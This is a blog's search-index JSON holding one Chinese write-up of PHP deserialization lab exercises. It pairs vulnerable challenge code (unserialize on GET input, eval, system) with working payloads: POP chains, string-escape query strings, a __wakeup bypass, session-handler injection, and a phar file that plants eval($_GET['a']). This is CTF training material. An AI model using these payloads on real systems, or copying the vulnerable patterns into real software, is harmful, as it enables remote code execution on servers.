[{"title":"测试用","url":"/2025/04/02/橙子靶场-反序列化(测试用)/","content":"\n# PHP反序列化\n\n```\n打的这个\nhttps://github.com/mcc0624/php_ser_Class\n视频\nhttps://www.bilibili.com/video/BV1tG4y1c7Vb/?spm_id_from=333.788.recommend_more_video.1\n```\n\n```\n魔术方法\n__construct()    //类的构造函数 当一个对象创建时调用\n__destruct()    //类的析构函数 当一个对象被销毁时调用\n__call()    //在对象中调用一个不可访问方法时调用\n__callStatic()    //用静态方式中调用一个不可访问方法时调用\n__get()    //获得一个类的成员变量时调用 尝试读取不可访问或未定义的类属性时被调用\n__set()    //设置一个类的成员变量时调用\n__isset()    //当对不可访问属性调用isset()或empty()时调用\n__unset()    //当对不可访问属性调用unset()时被调用\n__sleep()    //执行serialize()时，先会调用这个函数\n__wakeup()    //执行unserialize()时，先会调用这个函数\n__toString()    //类被当成字符串时的回应方法\n__invoke()    //调用函数的方式调用一个对象时的回应方法\n__set_state()    //调用var_export()导出类时，此静态方法会被调用\n__clone()    //当对象复制完成时调用\n__autoload()    //尝试加载未定义的类\n__debugInfo()    //打印所需调试信息\n```\n\n\n\n## 0x06 反序列化漏洞\t例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass test{\n    public $a = 'echo \"this is test!!\";';\n    public function displayVar() {\n        eval($this->a);\n    }\n}\n\n$get = $_GET[\"benben\"];\n$b = unserialize($get);\n$b->displayVar() ;\n\n?> \n```\n\n```php\n<?php\nerror_reporting(0);\nclass test{\n    public $a = 'echo \"this is test!!\";';\n    public function displayVar() {\n        eval($this->a);\n    }\n}\n$b=new test;\n$b->a=\"system('ls');\";\necho serialize($b);\n?>\n```\n\n## 0x07 魔术方法介绍，构造和析构\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User {\n    var $cmd = \"echo 'dazhuang666!!';\" ;\n    public function __destruct()\n    {\n        eval ($this->cmd);\n    }\n}\n$ser = $_GET[\"benben\"];\nunserialize($ser);\n?> \n```\n\n```php\n<?php\nclass User {\n    var $cmd;\n    public function __destruct()\n    {\n        eval ($this->cmd);\n    }\n}\n$a=new User();\n$a->cmd=\"system('ls /');\";\necho serialize($a);\n?>\n```\n\n## 0x08 weakup和sleep魔术方法\n\n### sleep例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User {\n    const SITE = 'uusama';\n    public $username;\n    public $nickname;\n    private $password;\n    public function __construct($username, $nickname, $password)    {\n        $this->username = $username;\n        $this->nickname = $nickname;\n        $this->password = $password;\n    }\n    public function __sleep() {\n        system($this->username);\n    }\n}\n$cmd = $_GET['benben'];\n$user = new User($cmd, 'b', 'c');\necho serialize($user);\n?> \n```\n\n```\n?benben=ls\n```\n\n### weakup例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User {\n    const SITE = 'uusama';\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() {\n        system($this->username);\n    }\n}\n$user_ser = $_GET['benben'];\nunserialize($user_ser);\n?> \n```\n\n```php\n<?php\nerror_reporting(0);\nclass User {\n    const SITE = 'uusama';\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() {\n        system($this->username);\n    }\n}\n$a=new User();\n$a->username=\"ls\";\necho serialize($a);\n?>\n```\n\n## 0x11 POP链基础前置知识1\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass index {\n    private $test;\n    public function __construct(){\n        $this->test = new normal();\n    }\n    public function __destruct(){\n        $this->test->action();\n    }\n}\nclass normal {\n    public function action(){\n        echo \"please attack me\";\n    }\n}\nclass evil {\n    var $test2;\n    public function action(){\n        eval($this->test2);\n    }\n}\nunserialize($_GET['test']);\n?>\n```\n\n```php\n<?php\nerror_reporting(0);\nclass index\n{\n    private $test;\n\n    public function __construct()\n    {\n        $this->test = new evil();\n    }\n}\nclass evil {\n    var $test2=\"system('ls /');\";\n    public function action(){\n        eval($this->test2);\n    }\n}\n$a=new index();\necho urlencode(serialize($a));\n\n?>\n```\n\n## 0x12 pop链构造前置知识2\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass fast {\n    public $source;\n    public function __wakeup(){\n        echo \"wakeup is here!!\";\n        echo  $this->source;\n    }\n}\nclass sec {\n    var $benben;\n    public function __tostring(){\n        echo \"tostring is here!!\";\n    }\n}\n$b = $_GET['benben'];\nunserialize($b);\n?> \n```\n\n```php\n<?php\nerror_reporting(0);\nclass fast {\n    public $source;\n    public function __wakeup(){\n        echo \"wakeup is here!!\";\n        echo  $this->source;\n    }\n}\nclass sec {\n    var $benben;\n    public function __tostring(){\n        echo \"tostring is here!!\";\n    }\n}\n$a=new fast();\n$a->source=new sec();\necho serialize($a);\n#O:4:\"fast\":1:{s:6:\"source\";O:3:\"sec\":1:{s:6:\"benben\";N;}}\n?>\n```\n\n## 0x13 POP链构造及POC构造\n\n```php\n <?php\n//flag is in flag.php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier {\n    private $var;\n    public function append($value)\n    {\n        include($value);\n        echo $flag;\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        echo $this->source;\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    unserialize($_GET['pop']);\n}\n?> \n```\n\n```php\n<?php\nerror_reporting(0);\nclass Modifier {\n    private $var=\"flag.php\";\n}\n\nclass Show{\n    public $source;\n    public $str;\n}\nclass Test{\n    public $p;\n}\n$a=new Show();\n$a->source=new Show();\n$a->source->str=new Test();\n$a->source->str->p=new Modifier();\necho urlencode(serialize($a));\n/*\nO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D \nctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}\n*/\n?> \n```\n\n## 0x14 php反序列化字符串逃减少\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass A{\n    public $v1 = \"abcsystem()system()system()\";\n    public $v2 = '123';\n\n    public function __construct($arga,$argc){\n            $this->v1 = $arga;\n            $this->v2 = $argc;\n    }\n}\n$a = $_GET['v1'];\n$b = $_GET['v2'];\n$data = serialize(new A($a,$b));\n$data = str_replace(\"system()\",\"\",$data);\nvar_dump(unserialize($data));\n?> \n```\n\n```\n?v1=abcsystem()system()&v2=;s:2:\"v3\";s:3:\"123\";}\n```\n\n## 0x15 PHP反序列化字符串逃逸增加\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass A{\n    public $v1 = 'ls';\n    public $v2 = '123';\n\n    public function __construct($arga,$argc){\n        $this->v1 = $arga;\n        $this->v2 = $argc;\n    }\n}\n$a = $_GET['v1'];\n$b = $_GET['v2'];\n$data =  serialize(new A($a,$b));\n$data = str_replace(\"ls\",\"pwd\",$data);\n\nvar_dump(unserialize($data)); \n```\n\n```\n?v1=lslslslslslslslslslslslslslslslslslslslslsls\";s:2:\"v2\";s:3:\"123\";}&v2=123\n```\n\n## 0x16 字符串逃逸增加例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($name){\n    $safe=array(\"flag\",\"php\");\n    $name=str_replace($safe,\"hack\",$name);\n    return $name;\n}\nclass test{\n    var $user;\n    var $pass='daydream';\n    function __construct($user){\n        $this->user=$user;\n    }\n}\n$param=$_GET['param'];\n$param=serialize(new test($param));\n$profile=unserialize(filter($param));\n\nif ($profile->pass=='escaping'){\n    echo file_get_contents(\"flag.php\");\n}\n?>\n```\n\n```\n?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp\";s:4:\"pass\";s:8:\"escaping\";}\n```\n\n```php\n?php\n\n/*\n * # -*- coding: utf-8 -*-\n * # @Author: benben\n * # @link: https://ctfstu.com\n *\n * */\n\n$flag = 'ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}';\n\n```\n\n## 0x17 字符串逃逸例题减少\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($name){\n    $safe=array(\"flag\",\"php\");\n    $name=str_replace($safe,\"hk\",$name);\n    return $name;\n}\nclass test{\n    var $user;\n    var $pass;\n    var $vip = false ;\n    function __construct($user,$pass){\n        $this->user=$user;\n    $this->pass=$pass;\n    }\n}\n$param=$_GET['user'];\n$pass=$_GET['pass'];\n$param=serialize(new test($param,$pass));\n$profile=unserialize(filter($param));\n\nif ($profile->vip){\n    echo file_get_contents(\"flag.php\");\n}\n?>\n```\n\n```\n?user=flagflagflagflagflagflagflagflagflagflag&pass=1\";s:4:\"pass\";s:6:\"benben\";s:3:\"vip\";b:1;}\n```\n\n```php\n?php\n\n/*\n * # -*- coding: utf-8 -*-\n * # @Author: benben\n * # @link: https://ctfstu.com\n *\n * */\n\n$flag = 'ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}';\n\n```\n\n## 0x18 weakup绕过\n\n```php\n <?php\nerror_reporting(0);\nclass secret{\n    var $file='index.php';\n\n    public function __construct($file){\n        $this->file=$file;\n    }\n\n    function __destruct(){\n        include_once($this->file);\n        echo $flag;\n    }\n\n    function __wakeup(){\n        $this->file='index.php';\n    }\n}\n$cmd=$_GET['cmd'];\nif (!isset($cmd)){\n    highlight_file(__FILE__);\n}\nelse{\n    if (preg_match('/[oc]:\\d+:/i',$cmd)){\n        echo \"Are you daydreaming?\";\n    }\n    else{\n        unserialize($cmd);\n    }\n}\n//sercet in flag.php\n?>\n\n```\n\n```php\n<?php\nerror_reporting(0);\nclass secret{\n    var $file='flag.php';\n}\n$a=new secret();\necho serialize($a);\n#O:6:\"secret\":1:{s:4:\"file\";s:8:\"flag.php\";}\n#O:+6:\"secret\":2:{s:4:\"file\";s:8:\"flag.php\";}\necho \"\\r\\n\";\necho urlencode('O:+6:\"secret\":2:{s:4:\"file\";s:8:\"flag.php\";}');\n?>\n\n```\n\n```\nctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}\n```\n\n## 0x19 序列化引用介绍\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\nclass just4fun {\n    var $enter;\n    var $secret;\n}\n\nif (isset($_GET['pass'])) {\n    $pass = $_GET['pass'];\n    $pass=str_replace('*','\\*',$pass);\n}\n\n$o = unserialize($pass);\n\nif ($o) {\n    $o->secret = \"*\";\n    if ($o->secret === $o->enter)\n        echo \"Congratulation! Here is my secret: \".$flag;\n    else\n        echo \"Oh no... You can't fool me\";\n}\nelse echo \"are you trolling?\";\n?>\n```\n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nclass just4fun {\n    var $enter;\n    var $secret;\n}\n$a=new just4fun();\n$a->enter=&$a->secret;\n\necho serialize($a);\n\n?>\n```\n\n```\nctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}\n```\n\n## 0x21 session反序列化例题\n\n```php\n <?php\nhighlight_file(__FILE__);\n/*hint.php*/\nsession_start();\nclass Flag{\n    public $name;\n    public $her;\n    function __wakeup(){\n        $this->her=md5(rand(1, 10000));\n        if ($this->name===$this->her){\n            include('flag.php');\n            echo $flag;\n        }\n    }\n}\n?> \n```\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['a'] = $_GET['a'];\n?> \n```\n\n在hint页面提交session就好，注意提交时要加上管道符|\n\n```\n?a=|O:4:\"Flag\":2:{s:4:\"name\";N;s:3:\"her\";R:2;}\n```\n\n```\nctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}\n```\n\n## 0x22 Phar反序列化介绍\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Testobj\n{\n    var $output=\"echo 'ok';\";\n    function __destruct()\n    {\n        eval($this->output);\n    }\n}\nif(isset($_GET['filename']))\n{\n    $filename=$_GET['filename'];\n    var_dump(file_exists($filename));\n}\n?>\n```\n\n```php\n<?php\nhighlight_file(__FILE__);\nclass Testobj\n{\n    var $output='';\n}\n\n@unlink('test.phar');   //删除之前的test.par文件(如果有)\n$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀\n$phar->startBuffering();  //开始写文件\n$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub\n$o=new Testobj();\n$o->output='eval($_GET[\"a\"]);';\n$phar->setMetadata($o);//写入meta-data\n$phar->addFromString(\"test.txt\",\"test\");  //添加要压缩的文件\n$phar->stopBuffering();\n?>\n```\n\n```\n?filename=phar://test.phar&a=phpinfo();\n```\n\n## 0x23 Phar反序列化例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass TestObject {\n    public function __destruct() {\n        include('flag.php');\n        echo $flag;\n    }\n}\n$filename = $_POST['file'];\nif (isset($filename)){\n    echo md5_file($filename);\n}\n//upload.php\n?>\n```\n\n需要生成一个.phar文件\n\n可以使用0x22给的文件生成脚本，\t记得修改php.ini文件\n\n在生成之后修改后缀以成功上传\n\n```post\nfile=phar://upload/test.jpg\n```\n\n```\nctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}\n```\n\n"},{"title":"about","url":"/about/index.html"},{"title":"categories","url":"/categories/index.html"},{"title":"tags","url":"/tags/index.html"}]